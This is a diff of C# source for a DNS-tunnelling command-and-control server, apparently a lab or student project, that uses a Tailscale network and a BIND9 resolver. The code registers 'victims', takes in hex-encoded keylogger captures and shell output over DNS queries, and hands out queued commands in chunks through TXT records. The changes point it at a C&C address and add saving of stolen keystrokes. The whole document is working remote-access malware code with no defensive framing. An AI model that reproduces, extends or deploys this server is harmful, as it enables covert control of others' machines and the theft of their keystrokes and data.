@@ -1,7 +1,7 @@
 using System.Net;
 using System.Net.Sockets;
-using Server.Models;
 using Server.DNS;
+using Server.Models;
 using Server.Utilities;
 
 namespace Server.Logic
@@ -11,11 +11,11 @@ namespace Server.Logic
         private UdpClient? _udpServer;
         private bool _isRunning;
         private string _domain = "example.com";
-        private string _serverIp = "127.0.0.1";
+        private string _serverIp = "100.123.123.123";  // Default C&C IP on Tailscale
         
         private ClientManager? _clientManager;
         private ProtocolHandler? _protocolHandler;
-        private AuthoritativeDNSHandler? _dnsHandler;
+        // AuthoritativeDNSHandler removed - BIND9 handles normal DNS queries
         private readonly Dictionary<int, Queue<string>> _commandQueues = new();
         private readonly Dictionary<int, (string fullCommand, int totalChunks, int currentChunk)> _commandChunkState = new();
 
@@ -37,28 +37,27 @@ namespace Server.Logic
             
             _clientManager = new ClientManager(logPath);
             _protocolHandler = new ProtocolHandler(_domain);
-            _dnsHandler = new AuthoritativeDNSHandler(_domain, _serverIp);
+            // BIND9 handles normal DNS, no need for AuthoritativeDNSHandler
             
             _clientManager.OnClientAdded += (info) => OnClientAdded?.Invoke(info);
             _clientManager.OnClientCountChanged += (count) => OnClientCountChanged?.Invoke(count);
-            _protocolHandler.OnDataReceived += (id, data) =>
-            {
-                LogMessage("  => Decoded: '" + data + "'");
-                OnDataReceived?.Invoke(id, data);
-            };
+            _protocolHandler.OnDataReceived += (id, data) => OnDataReceived?.Invoke(id, data);
 
             try
             {
-                _udpServer = new UdpClient(port);
+                // Bind to specific IP address instead of 0.0.0.0
+                IPEndPoint localEndPoint = new IPEndPoint(IPAddress.Parse(_serverIp), port);
+                _udpServer = new UdpClient(localEndPoint);
                 _isRunning = true;
 
-                LogMessage($"[Started] Authoritative DNS Server listening on port {port}");
+                LogMessage($"[Started] Authoritative DNS Server listening on {_serverIp}:{port}");
                 LogMessage($"[Domain] {_domain}");
                 LogMessage($"[Server IP] {_serverIp}");
                 LogMessage($"[Logs] {Path.GetFullPath(logPath)}");
-                LogMessage("[MODE] LOCAL TEST - Direct client connections");
-                LogMessage("  => Client connects directly to this server");
-                LogMessage("  => No DNS Resolver needed");
+                LogMessage("[ARCHITECTURE] Tailscale DNS Tunneling");
+                LogMessage("  => DNS Resolver: 100.111.111.100 (Bind9)");
+                LogMessage("  => C&C Server: 100.123.123.123 (this machine)");
+                LogMessage("  => Victims: 100.x.x.x (clients)");
 
                 Task.Run(() => ListenForQueries());
             }
@@ -102,7 +101,7 @@ namespace Server.Logic
 
         private void ProcessQuery(byte[] data, IPEndPoint remoteEP)
         {
-            if (_clientManager == null || _protocolHandler == null || _dnsHandler == null)
+            if (_clientManager == null || _protocolHandler == null)
                 return;
 
             try
@@ -118,26 +117,35 @@ namespace Server.Logic
                     string[] parts = extractedData.Split('.', 2);
                     string packetType = parts[0];
 
-                    // Type A: Khoi tao ket noi (QTYPE=1 A record)
                     if (packetType == "a" && dnsQuery.QueryType == 1)
                     {
-                        LogMessage($"\n[Query] {queryName} from {remoteEP.Address}");
+                        LogMessage($"\n[Connect] {queryName}");
                         
-                        // Kiem tra client da ton tai theo IP
-                        int existingId = _clientManager.GetConnectionIdByIp(remoteEP.Address.ToString());
+                        string[] queryParts = queryName.Split('.');
+                        string victimIP = remoteEP.Address.ToString();
+                        
+                        if (queryParts.Length >= 6)
+                        {
+                            string parsedIP = $"{queryParts[1]}.{queryParts[2]}.{queryParts[3]}.{queryParts[4]}";
+                            
+                            if (System.Net.IPAddress.TryParse(parsedIP, out _))
+                            {
+                                victimIP = parsedIP;
+                            }
+                        }
+                        
+                        int existingId = _clientManager.GetConnectionIdByIp(victimIP);
                         int connectionId;
                         
                         if (existingId > 0)
                         {
-                            LogMessage($"[Connect] Client already exists with ID #{existingId}");
                             connectionId = existingId;
                         }
                         else
                         {
-                            LogMessage($"[Connect] Starting connection #{_clientManager.ClientCount + 1}");
-                            connectionId = _clientManager.AddClient(remoteEP.Address.ToString());
+                            connectionId = _clientManager.AddClient(victimIP);
+                            LogMessage($"[Client #{connectionId}] {victimIP}");
                             
-                            // Khoi tao command queue cho ket noi nay
                             lock (_commandQueues)
                             {
                                 if (!_commandQueues.ContainsKey(connectionId))
@@ -150,35 +158,44 @@ namespace Server.Logic
                         string fakeIp = IPGenerator.CreateStartIp(connectionId - 1);
                         response = DNSResponseBuilder.CreateSimpleAResponse(data, dnsQuery, fakeIp);
                     }
-                    // Type B: Du lieu keylogger (QTYPE=1 A record)
                     else if (packetType == "b" && dnsQuery.QueryType == 1)
                     {
-                        LogMessage($"\n[Query] {queryName} from {remoteEP.Address}");
                         string rest = parts.Length > 1 ? parts[1] : "";
                         
+                        // Parse packet and extract hex data
+                        string[] bParts = rest.Split('.');
+                        if (bParts.Length < 3)
+                        {
+                            throw new DNSSyntaxException();
+                        }
+                        
+                        string hexData = bParts[2];
+                        byte[] decodedData = Convert.FromHexString(hexData);
+                        string keylogData = System.Text.Encoding.UTF8.GetString(decodedData);
+                        
+                        // Parse and save to parser
                         var metadata = _protocolHandler.ParseDataPacket(rest, _clientManager);
-                        LogMessage($"[Data] Keylogger data from connection #{metadata.ConnectionId}");
+                        
+                        // Save keylogger data immediately
+                        var parser = _clientManager.GetParser(metadata.ConnectionId);
+                        if (parser != null && decodedData.Length > 0)
+                        {
+                            parser.SaveDataByType(keylogData, Models.LogType.Keylogger);
+                        }
+                        
+                        LogMessage($"[Keylog] Client #{metadata.ConnectionId}");
 
                         string responseIp = IPGenerator.CreateResponseIp(ResponseCode.OK);
                         response = DNSResponseBuilder.CreateSimpleAResponse(data, dnsQuery, responseIp);
                     }
-                    // Type C: Cac chunk ket qua lenh (QTYPE=1 A record)
                     else if (packetType == "c" && dnsQuery.QueryType == 1)
                     {
-                        LogMessage($"\n[Query] {queryName} from {remoteEP.Address}");
                         string rest = parts.Length > 1 ? parts[1] : "";
                         
-                        LogMessage($"[Debug] Parsing Type C, rest: '{rest}'");
-                        
-                        // Parse: c.packetNumber.offset.connectionId.hexData.domain
-                        // Can tach domain truoc, roi parse phan con lai
-                        // Format: packetNumber.offset.connectionId.hexData.<domain parts>
                         string[] cParts = rest.Split('.');
-                        LogMessage($"[Debug] Split into {cParts.Length} parts");
                         
                         if (cParts.Length < 4)
                         {
-                            LogMessage($"[Error] Type C packet has only {cParts.Length} parts, need at least 4");
                             throw new DNSSyntaxException();
                         }
 
@@ -186,13 +203,10 @@ namespace Server.Logic
                         int offset = int.Parse(cParts[1]);
                         int connectionId = int.Parse(cParts[2]);
                         
-                        // HexData is everything between connectionId and domain
-                        // Find where domain starts by counting dots from the end
                         int domainDots = _domain.Count(c => c == '.');
                         int hexDataEndIndex = cParts.Length - domainDots - 1;
                         
                         string hexData = cParts[3];
-                        // If there are more parts before domain, it's part of hexData
                         if (hexDataEndIndex > 3)
                         {
                             for (int i = 4; i <= hexDataEndIndex; i++)
@@ -200,17 +214,12 @@ namespace Server.Logic
                                 hexData += "." + cParts[i];
                             }
                         }
-                        
-                        LogMessage($"[Debug] Parsed - Packet: {packetNumber}, Offset: {offset}, ConnID: {connectionId}, HexLen: {hexData.Length}");
 
                         if (!_clientManager.ConnectionExists(connectionId))
                         {
                             throw new NXConnectionException();
                         }
-
-                        LogMessage($"[Data] Command result chunk from connection #{connectionId} (packet #{packetNumber}, offset {offset})");
                         
-                        // Parse hex data va them vao parser
                         var parser = _clientManager.GetParser(connectionId);
                         if (parser != null)
                         {
@@ -218,29 +227,23 @@ namespace Server.Logic
                             parser.AddData(packetNumber, decodedData);
                             
                             string decodedText = System.Text.Encoding.UTF8.GetString(decodedData);
-                            LogMessage($"  => Chunk data: '{decodedText}'");
                             
-                            // Kich hoat event cho ket qua lenh (cap nhat shell window)
+                            // Save shell output immediately
+                            parser.SaveDataByType(decodedText, Models.LogType.Shell);
+                            
                             OnCommandResult?.Invoke(connectionId, decodedText);
                         }
 
                         string responseIp = IPGenerator.CreateResponseIp(ResponseCode.OK);
                         response = DNSResponseBuilder.CreateSimpleAResponse(data, dnsQuery, responseIp);
                     }
-                    // Type P: Poll lay lenh (QTYPE=16 TXT record)
                     else if (packetType == "p" && dnsQuery.QueryType == 16)
                     {
-                        LogMessage($"\n[Query] {queryName} from {remoteEP.Address}");
-                        LogMessage($"[Debug] Query type: {dnsQuery.QueryType}, Expected: 16 (TXT)");
                         string rest = parts.Length > 1 ? parts[1] : "";
-                        LogMessage($"[Debug] Parsing rest: '{rest}'");
                         
-                        // Parse: p.packetNumber.offset.connectionId.domain
                         string[] pParts = rest.Split('.');
-                        LogMessage($"[Debug] Split into {pParts.Length} parts");
                         if (pParts.Length < 3)
                         {
-                            LogMessage($"[Error] Not enough parts in Type P packet: {pParts.Length}");
                             throw new DNSSyntaxException();
                         }
 
@@ -253,75 +256,58 @@ namespace Server.Logic
                             throw new NXConnectionException();
                         }
 
-                        LogMessage($"[Poll] Connection #{connectionId} polling for command (offset {offset})");
-
                         string commandChunk = "";
                         lock (_commandQueues)
                         {
-                            LogMessage($"[Debug] Command queue exists: {_commandQueues.ContainsKey(connectionId)}");
-                            if (_commandQueues.ContainsKey(connectionId))
+                            if (!_commandChunkState.ContainsKey(connectionId))
                             {
-                                LogMessage($"[Debug] Commands in queue: {_commandQueues[connectionId].Count}");
+                                if (_commandQueues.ContainsKey(connectionId) && _commandQueues[connectionId].Count > 0)
+                                {
+                                    string fullCommand = _commandQueues[connectionId].Dequeue();
+                                    int totalChunks = (int)Math.Ceiling(fullCommand.Length / 60.0);
+                                    _commandChunkState[connectionId] = (fullCommand, totalChunks, 0);
+                                    LogMessage($"[Command] Sending to #{connectionId}: {fullCommand}");
+                                }
                             }
                             
-            if (!_commandChunkState.ContainsKey(connectionId))
-            {
-                // Khong co lenh dang xu ly, kiem tra lenh moi
-                if (_commandQueues.ContainsKey(connectionId) && _commandQueues[connectionId].Count > 0)
-                {
-                    string fullCommand = _commandQueues[connectionId].Dequeue();
-                    int totalChunks = (int)Math.Ceiling(fullCommand.Length / 60.0);
-                    _commandChunkState[connectionId] = (fullCommand, totalChunks, 0);
-                    LogMessage($"  => Preparing to send command: '{fullCommand}' ({totalChunks} chunks)");
-                }
-            }
-            
-            if (_commandChunkState.ContainsKey(connectionId))
-            {
-                var state = _commandChunkState[connectionId];
-                int chunkStart = offset * 60;
-                
-                if (chunkStart < state.fullCommand.Length)
-                {
-                    int chunkLen = Math.Min(60, state.fullCommand.Length - chunkStart);
-                    string rawChunk = state.fullCommand.Substring(chunkStart, chunkLen);
-                    
-                    // Ma hoa hex de bao toan UTF-8 encoding
-                    byte[] chunkBytes = System.Text.Encoding.UTF8.GetBytes(rawChunk);
-                    commandChunk = Convert.ToHexString(chunkBytes).ToLower();
-                    
-                    LogMessage($"  => Sending chunk {offset + 1}/{state.totalChunks}: '{rawChunk}'");
-                    LogMessage($"  => Hex encoded ({chunkBytes.Length} bytes): {commandChunk}");
-                }
-                else
-                {
-                    // Da gui het chunks, xoa state
-                    _commandChunkState.Remove(connectionId);
-                    LogMessage($"  => All chunks sent, returning empty (end signal)");
-                }
-            }
-            else
-            {
-                LogMessage($"  => No commands queued");
-            }
+                            if (_commandChunkState.ContainsKey(connectionId))
+                            {
+                                var state = _commandChunkState[connectionId];
+                                int chunkStart = offset * 60;
+                                
+                                if (chunkStart < state.fullCommand.Length)
+                                {
+                                    int chunkLen = Math.Min(60, state.fullCommand.Length - chunkStart);
+                                    string rawChunk = state.fullCommand.Substring(chunkStart, chunkLen);
+                                    
+                                    byte[] chunkBytes = System.Text.Encoding.UTF8.GetBytes(rawChunk);
+                                    commandChunk = Convert.ToHexString(chunkBytes).ToLower();
+                                    
+                                    int nextChunkStart = (offset + 1) * 60;
+                                    if (nextChunkStart >= state.fullCommand.Length)
+                                    {
+                                        _commandChunkState.Remove(connectionId);
+                                    }
+                                }
+                                else
+                                {
+                                    _commandChunkState.Remove(connectionId);
+                                }
+                            }
                         }
 
                         response = DNSResponseBuilder.CreateTXTResponse(data, dnsQuery, commandChunk);
                     }
                     else
                     {
-                        throw new UnrelatedException();
+                        // Unknown packet type - should not happen as BIND9 only forwards our protocol queries
+                        LogMessage($"[Warning] Unknown packet type from {remoteEP.Address}: {packetType}");
+                        response = DNSResponseBuilder.CreateEmptyResponse(data, dnsQuery);
                     }
                 }
                 catch (ShortCircuitException)
                 {
-                    LogMessage("  └─> Short circuit: duplicate packet");
                     response = DNSResponseBuilder.CreateEmptyResponse(data, dnsQuery);
-                }
-                catch (UnrelatedException)
-                {
-                    LogMessage($"[Normal DNS Query] {queryName}");
-                    response = _dnsHandler.HandleQuery(data, dnsQuery, queryName);
                 }
                 catch (DNSSyntaxException)
                 {
@@ -365,20 +351,14 @@ namespace Server.Logic
         {
             lock (_commandQueues)
             {
-                LogMessage($"[Debug] EnqueueCommand called for connection #{connectionId}");
-                LogMessage($"[Debug] Command queues count: {_commandQueues.Count}");
-                LogMessage($"[Debug] Queue exists for #{connectionId}: {_commandQueues.ContainsKey(connectionId)}");
-                
                 if (_commandQueues.ContainsKey(connectionId))
                 {
                     _commandQueues[connectionId].Enqueue(command);
-                    LogMessage($"[Command] ✅ Queued for connection #{connectionId}: '{command}'");
-                    LogMessage($"[Debug] Queue now has {_commandQueues[connectionId].Count} command(s)");
+                    LogMessage($"[Enqueue] #{connectionId}: {command}");
                 }
                 else
                 {
-                    LogMessage($"[Command] ❌ ERROR: No command queue exists for connection #{connectionId}");
-                    LogMessage($"[Debug] Available connection IDs: {string.Join(", ", _commandQueues.Keys)}");
+                    LogMessage($"[Error] No queue for connection #{connectionId}");
                 }
             }
         }
